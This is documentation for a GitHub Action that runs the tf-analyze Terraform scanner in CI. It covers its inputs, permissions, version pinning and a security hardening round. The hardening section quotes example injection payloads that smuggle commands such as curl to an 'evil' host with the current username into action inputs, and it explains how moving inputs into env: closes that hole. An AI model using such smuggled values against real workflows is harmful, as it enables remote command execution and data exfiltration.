# GitHub Action

The composite action at
[`integrations/github-action.yml`](https://github.com/ChrisAdkin8/tf-analyze/blob/main/integrations/github-action.yml)
runs tf-analyze in CI, posts an engine-rendered summary to the PR,
attaches inline `suggestion` blocks on changed lines, uploads SARIF to
Code Scanning, and stores an HTML report as a build artifact.

It is the surface most external users encounter first, so the contract
is locked down by 17 drift-gate tests in `tests/test_github_action.py`
— particularly the clone URL (Round 30 P0.2 fixed a publish-blocking
bug where the action pointed at the wrong repository) and the
`--format pr-summary` plumbing that R28.1 added.

## Install

Drop the workflow into your repository:

```sh
mkdir -p .github/workflows
curl -L \
  https://raw.githubusercontent.com/ChrisAdkin8/tf-analyze/main/integrations/github-action.yml \
  > .github/workflows/tf-analyze.yml
```

Or reference it as a composite action from any workflow:

```yaml
- uses: ChrisAdkin8/tf-analyze@v1
  with:
    fail-on: HIGH
```

## Inputs

| Input | Default | Purpose |
|---|---|---|
| `fail-on` | `HIGH` | Minimum urgency that fails the job. One of `CRITICAL` / `HIGH` / `MEDIUM` / `LOW`. |
| `section` | _empty_ | Restrict findings to one catalogue section (`security` / `robustness` / `ops` / …). Empty = all sections. |
| `compliance-framework` | _empty_ | Optional. `cis` / `pci_dss` / `soc2` / `owasp_iac` / `all`. When set, the engine renders a compliance gap report alongside its findings and the PR comment gains a collapsible `<details>📋 Compliance: <fw></details>` section. |
| `attack-graph` | `false` | Build the internet → crown-jewels graph; promotes critical-path findings and embeds the Mermaid graph in the PR summary. |
| `show-info` | `false` | Include INFO-tier advisories (Module Reuse advisories, etc.). Default off because INFO findings are advisory rather than gating. |
| `ref` | `main` | Git ref of tf-analyze to install (branch, tag, or 7+ char SHA). Pin to a release tag for reproducible CI; default tracks `main`. |
| `post-pr-comment` | `true` | Post the suggestion-block comments + summary comment on PRs. Set `false` to skip the comment surface entirely. |

## Behavior

- **PR runs** use `--mode diff` — only changed files are scanned.
  Failures are gated by the `fail-on` threshold (default `HIGH`).
- **Pushes to `main` / `master`** run `--mode static` — full workspace
  scan. SARIF is always uploaded; the HTML report is always attached.
- **SARIF upload** lights up findings in the repo's Security → Code
  Scanning tab with line-level annotations on the PR diff. Free-tier
  repos lack Code Scanning; the action's SARIF step is wrapped in
  `continue-on-error: true` so the job stays green when the upload
  endpoint isn't available.
- **PR comment** is upserted on every run — repeated CI runs replace
  the prior summary comment instead of stacking N comments per PR. The
  body is sourced from the engine's `--format pr-summary` output (R28.1)
  with a hand-rolled fallback table if the file is somehow empty.
- **Inline suggestions** — every finding with a `fix_hcl` snippet that
  lands on a changed line gets a `suggestion` block comment so reviewers
  can click **Apply suggestion** and commit the fix in one click.
- **HTML artifact** — the full HTML report is uploaded with 30-day
  retention, downloadable from the workflow run page for offline review.

## Required permissions

The workflow declares:

```yaml
permissions:
  contents: read
  security-events: write   # SARIF upload
  pull-requests: write     # PR comment
```

For a repository with restrictive default permissions, ensure these
are granted to `GITHUB_TOKEN` either at the workflow level (as above)
or via repo settings.

## Pinning the engine version

Production CI should pin `ref` to a release tag rather than tracking
`main`:

```yaml
- uses: ChrisAdkin8/tf-analyze@v1
  with:
    ref: v0.2.1                     # or a 7+ char commit SHA
```

The fetch step uses `--depth 1 --branch <ref>` for branch/tag refs and
falls back to a full clone + `git checkout` for SHA refs.

## Worked example: OWASP IaC compliance gate in CI

```yaml
name: tf-analyze
on:
  pull_request:
    paths: ["**/*.tf", "**/*.tfvars"]

jobs:
  scan:
    uses: ChrisAdkin8/tf-analyze/.github/workflows/tf-analyze.yml@v1
    with:
      fail-on: HIGH
      compliance-framework: owasp_iac
      attack-graph: true
      ref: v0.2.1
```

Reviewers see the engine's PR summary (score + grade emoji + top-3
findings + the Mermaid attack graph), inline `suggestion` blocks on
every fixable finding, and a collapsible compliance section listing
which OWASP IaC controls are passing or failing — all in the PR
conversation thread, no clicks elsewhere.

## Round 30 P0.2 fix (clone URL)

If you adopted the action before May 2026, **upgrade.** The pre-fix
workflow cloned the wrong repository (`anthropics/claude-code-skills`)
and would have failed on every CI run with
`~/.tf-analyze/scripts/detect.py: No such file or directory`. The fix
is in `main` from commit `be39331` onward; pin to `v0.2.1` or later
for the corrected clone URL.

## Round 30.12 hardening (script injection + engine-crash visibility)

The R30.12 audit pass made two user-visible changes to the action's
internals. **The input contract is unchanged** — the inputs table above
still describes the same shape — but the implementation now:

### Inputs flow through `env:` (script-injection boundary)

Every user-supplied input (`fail-on`, `target`, `section`,
`attack-graph`, `baseline`, `extra-args`) is now passed to the shell
via `env:` rather than templated via `${{ inputs.X }}` directly into
the script body. Why this matters: GitHub Actions templating performs
string substitution into the YAML source **before** the shell or
Python sees the script. A reusable workflow whose `fail-on` is supplied
by an upstream caller (e.g. via `with:` from a third-party `uses:`
block) could previously pass

```yaml
fail-on: '"); import os; os.system("curl evil/$(whoami)"); _ = ("'
```

and that string would land verbatim inside the Python heredoc, executing
the injected code. The `env:` boundary makes the value reachable only
via `os.environ` at runtime — no source-text substitution, no injection.

The same fix applies to `extra-args`: where the array was previously
built via `EXTRA=(${{ inputs.extra-args }})` (unquoted shell array
literal — `$(curl evil)` in the input would execute when the array was
parsed), it now uses `read -ra EXTRA <<<"${TFA_EXTRA_ARGS}"`. `read -ra`
performs whitespace tokenisation but **not** command substitution, so a
user passing `--extra-args "--foo $(curl evil) --bar"` gets four
literal arguments and no shell-out.

If you wrote a workflow that called this action directly with curated,
trusted inputs (the common case), nothing changes. If you wrote a
reusable workflow that exposed these inputs to untrusted callers, the
injection surface is now closed.

### Engine crashes surface as `::error::` annotations

The previous `Run tf-analyze` step ended each format-specific scan
invocation with `|| true` so the workflow could continue past a
non-zero exit code (necessary because exit 1 = findings present, which
is the expected case). The unintended consequence: a CRITICAL engine
crash (OOM, segfault, signal 9 from a hung worker) returned exit
≥ 2 and **was indistinguishable** from "scan succeeded, no findings."

The new shape captures the exit code per format:

| Exit code | Meaning | Action behaviour |
|---|---|---|
| `0` | Engine ran clean, no findings | Continue silently |
| `1` | Engine ran clean, findings present | Continue (the PR comment surfaces them) |
| `≥ 2` | Engine crashed | Emit `::error::tf-analyze: <fmt> scan crashed (exit N). See <stderr-file> for the engine traceback.` |

The workflow still continues past the crash (the JSON-load step has a
try/except that supplies zeroed defaults, so downstream steps run) but
the `::error::` annotation makes the failure visible in the workflow
status. Operators can no longer mistake a crashed engine for a clean
scan.

The per-format stderr files (`tf-analyze-json-stderr.txt`,
`tf-analyze-sarif-stderr.txt`, etc.) are still collected and shown in
collapsible groups in the workflow log.
